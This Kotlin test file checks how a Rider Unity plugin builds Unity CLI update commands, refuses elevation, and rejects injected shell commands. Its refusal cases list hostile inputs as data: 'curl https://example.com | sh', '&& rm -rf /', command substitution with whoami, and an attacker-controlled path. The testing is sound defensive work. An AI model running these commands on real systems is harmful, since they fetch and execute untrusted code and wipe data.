package com.jetbrains.rider.unity.test.cases.agents

import com.jetbrains.rider.plugins.unity.settings.agents.UNITY_CLI_CDN_BASE_VARIABLE
import com.jetbrains.rider.plugins.unity.settings.agents.UnityCliFailure
import com.jetbrains.rider.plugins.unity.settings.agents.UnityCliInstallMethod
import com.jetbrains.rider.plugins.unity.settings.agents.splitUnityCliUpdateCommand
import com.jetbrains.rider.plugins.unity.settings.agents.unityCliSelfUpdateSubcommand
import com.jetbrains.rider.plugins.unity.settings.agents.unityCliUpdateCommandForClipboard
import com.jetbrains.rider.plugins.unity.settings.agents.unityCliUpdateCommandLine
import com.jetbrains.rider.plugins.unity.settings.agents.unityCliUpdateOutcome
import com.jetbrains.rider.test.annotations.Subsystem
import com.jetbrains.rider.test.annotations.report.Feature
import com.jetbrains.rider.test.reporting.SubsystemConstants
import com.jetbrains.rider.test.shared.constants.TeamCityTags
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertNull
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.Tag
import org.junit.jupiter.api.Test
import java.nio.file.Path

/**
 * What Rider runs to update the Unity CLI, and what it refuses to run.
 *
 * **No case here runs a package manager.** `brew upgrade unity-cli` needs a Homebrew installation
 * and a network, and it changes the machine. A human verifies it separately. These cases pin the
 * command line and the outcome rule, which is everything Rider decides before the package manager
 * takes over.
 *
 * The command line is asserted by its **parts** and never by `commandLineString`. That string cannot
 * see the environment, and it cannot show that the argv holds no shell. These cases are also the
 * positive control for the no-elevation claim: no `sudo` reaches any command line.
 *
 * [unityCliUpdateCommandLine] builds every argv itself. It reads one word from the report of the
 * CLI, the subcommand of a CDN update, and it accepts only two values. The reported command also
 * reaches [unityCliUpdateCommandForClipboard], which shows it and never runs it. A second block of
 * cases pins that function on its own.
 */
@Subsystem(SubsystemConstants.UNITY_PLUGIN)
@Feature("Unity for Agents")
@Tag(TeamCityTags.Plugins.Unity.General)
class UnityCliUpdateTest {
    private val cliPath: Path = Path.of("/opt/homebrew/bin/unity")

    /** What `unity diagnose update` reports for a CDN copy of 1.0.0-beta.8 and later. */
    private val selfUpdateReport = "unity self-update"

    @Test
    fun `a CDN install updates itself, and it skips the confirmation prompt`() {
        val commandLine = unityCliUpdateCommandLine(UnityCliInstallMethod.CDN, cliPath, selfUpdateReport)

        assertEquals(cliPath.toString(), commandLine?.exePath)
        // Never `unity version`, and never `--dry-run`. Rider closes stdin, so a prompt would wait
        // for ever.
        assertEquals(listOf("self-update", "-y"), commandLine?.parametersList?.list)
        // The variable replaces the base of every download the CLI makes, so a value in the
        // environment of the user would redirect the update.
        assertEquals("", commandLine?.environment?.get(UNITY_CLI_CDN_BASE_VARIABLE))
    }

    @Test
    fun `Homebrew runs a fixed argv, and never the reported command`() {
        val commandLine = unityCliUpdateCommandLine(UnityCliInstallMethod.HOMEBREW, cliPath, "brew upgrade unity-cli")

        assertEquals("brew", commandLine?.exePath)
        assertEquals(listOf("upgrade", "unity-cli"), commandLine?.parametersList?.list)
    }

    @Test
    fun `winget runs a fixed argv, and never the reported command`() {
        val commandLine = unityCliUpdateCommandLine(UnityCliInstallMethod.WINGET, cliPath, "winget upgrade Unity.CLI")

        assertEquals("winget", commandLine?.exePath)
        assertEquals(listOf("upgrade", "Unity.CLI"), commandLine?.parametersList?.list)
    }

    @Test
    fun `no command line elevates, on any method Rider owns`() {
        val commandLines = listOf(
            unityCliUpdateCommandLine(UnityCliInstallMethod.CDN, cliPath, selfUpdateReport),
            unityCliUpdateCommandLine(UnityCliInstallMethod.HOMEBREW, cliPath, null),
            unityCliUpdateCommandLine(UnityCliInstallMethod.WINGET, cliPath, null),
        )

        for (commandLine in commandLines) {
            val parts = listOf(commandLine?.exePath).plus(commandLine?.parametersList?.list.orEmpty())
            assertTrue("sudo" !in parts, "a command line elevates: $parts")
            assertTrue(parts.none { it?.endsWith("/sudo") == true }, "a command line elevates: $parts")
        }
    }

    @Test
    fun `apt and dnf launch nothing, because the command needs sudo`() {
        assertNull(
            unityCliUpdateCommandLine(UnityCliInstallMethod.APT, cliPath, "sudo apt install --only-upgrade unity-cli"),
            "Rider built a command line for apt",
        )
        assertNull(
            unityCliUpdateCommandLine(UnityCliInstallMethod.DNF, cliPath, "sudo dnf upgrade unity-cli"),
            "Rider built a command line for dnf",
        )
    }

    @Test
    fun `an unknown method launches nothing`() {
        assertNull(unityCliUpdateCommandLine(UnityCliInstallMethod.UNKNOWN, cliPath, null))
    }

    // --- unityCliSelfUpdateSubcommand: the CDN subcommand, which the CLI renamed ---

    @Test
    fun `a CLI that reports self-update runs self-update`() {
        // Measured on 1.0.0-beta.8 and 1.0.0-beta.11.
        assertEquals("self-update", unityCliSelfUpdateSubcommand("unity self-update"))
    }

    @Test
    fun `a CLI older than the rename runs upgrade`() {
        // Measured on 1.0.0-beta.5, which answers `unknown command 'self-update'` and exits 2.
        assertEquals("upgrade", unityCliSelfUpdateSubcommand("unity upgrade"))
    }

    @Test
    fun `a CLI that reports nothing runs upgrade`() {
        // Every measured version runs `upgrade`, so it is the safe fallback.
        assertEquals("upgrade", unityCliSelfUpdateSubcommand(null))
        assertEquals("upgrade", unityCliSelfUpdateSubcommand("   "))
        assertEquals("upgrade", unityCliSelfUpdateSubcommand("unity"))
    }

    @Test
    fun `a word the CLI invents later is refused, and upgrade runs instead`() {
        val refused = listOf(
            "unity renew",
            "unity --version",
            // A command that needs a shell never splits, so it never reaches the allowlist.
            "unity self-update; rm -rf /",
            "unity `whoami`",
        )

        for (command in refused) {
            assertEquals("upgrade", unityCliSelfUpdateSubcommand(command), "Rider took a subcommand from: $command")
        }
    }

    @Test
    fun `a plain command splits on whitespace`() {
        assertEquals(
            listOf("brew", "upgrade", "unity-cli"),
            splitUnityCliUpdateCommand("  brew   upgrade\tunity-cli  "),
        )
    }

    @Test
    fun `a command that needs a shell does not split`() {
        val refused = listOf(
            "apt install --only-upgrade unity-cli; curl https://example.com | sh",
            "apt install --only-upgrade unity-cli && rm -rf /",
            "apt install `whoami`",
            // The dollar is concatenated, because an escape of it inside a string reads badly.
            "apt install " + '$' + "(whoami)",
            "apt install --only-upgrade unity-cli > /tmp/out",
            "apt install \"unity cli\"",
        )

        for (command in refused) {
            assertNull(splitUnityCliUpdateCommand(command), "Rider split a command that needs a shell: $command")
        }
    }

    @Test
    fun `a stopped update carries its exit code out`() {
        assertEquals(UnityCliFailure.UPDATE_EXIT_CODE, unityCliUpdateOutcome(1))
        assertEquals(UnityCliFailure.UPDATE_EXIT_CODE, unityCliUpdateOutcome(127))
    }

    @Test
    fun `an update that never started names no exit code`() {
        assertEquals(UnityCliFailure.LAUNCH_FAILED, unityCliUpdateOutcome(null))
    }

    @Test
    fun `an update that exits 0 is no failure`() {
        assertNull(unityCliUpdateOutcome(0), "a working update reported a failure")
    }

    // --- unityCliUpdateCommandForClipboard: the reported command, for the clipboard row alone ---

    @Test
    fun `apt shows the reported command on the clipboard`() {
        val command = "sudo apt install --only-upgrade unity-cli"
        assertEquals(command, unityCliUpdateCommandForClipboard(UnityCliInstallMethod.APT, command))
    }

    @Test
    fun `apt-get is accepted for the apt install method`() {
        val command = "sudo apt-get install --only-upgrade unity-cli"
        assertEquals(command, unityCliUpdateCommandForClipboard(UnityCliInstallMethod.APT, command))
    }

    @Test
    fun `dnf shows the reported command on the clipboard`() {
        val command = "sudo dnf upgrade unity-cli"
        assertEquals(command, unityCliUpdateCommandForClipboard(UnityCliInstallMethod.DNF, command))
    }

    @Test
    fun `a method Rider runs itself shows nothing on the clipboard`() {
        assertNull(unityCliUpdateCommandForClipboard(UnityCliInstallMethod.CDN, "unity self-update -y"))
        assertNull(unityCliUpdateCommandForClipboard(UnityCliInstallMethod.HOMEBREW, "brew upgrade unity-cli"))
        assertNull(unityCliUpdateCommandForClipboard(UnityCliInstallMethod.WINGET, "winget upgrade Unity.CLI"))
    }

    @Test
    fun `an absolute path to the package manager is refused on the clipboard`() {
        // An attacker-controlled directory earlier in the reported command must not pass this check.
        assertNull(
            unityCliUpdateCommandForClipboard(
                UnityCliInstallMethod.APT,
                "/tmp/attacker/apt install --only-upgrade unity-cli",
            ),
        )
    }

    @Test
    fun `a reported program that does not match the reported method is refused on the clipboard`() {
        assertNull(unityCliUpdateCommandForClipboard(UnityCliInstallMethod.APT, "sudo dnf upgrade unity-cli"))
        assertNull(unityCliUpdateCommandForClipboard(UnityCliInstallMethod.DNF, "curl https://example.com"))
    }

    @Test
    fun `a missing reported command shows nothing on the clipboard`() {
        assertNull(unityCliUpdateCommandForClipboard(UnityCliInstallMethod.APT, null))
        assertNull(unityCliUpdateCommandForClipboard(UnityCliInstallMethod.APT, "   "))
    }

    @Test
    fun `a clipboard command that needs a shell is refused`() {
        val refused = listOf(
            "sudo apt install --only-upgrade unity-cli; curl https://example.com | sh",
            "sudo apt install --only-upgrade unity-cli && rm -rf /",
        )
        for (command in refused) {
            assertNull(
                unityCliUpdateCommandForClipboard(UnityCliInstallMethod.APT, command),
                "Rider showed a command that needs a shell: $command",
            )
        }
    }
}
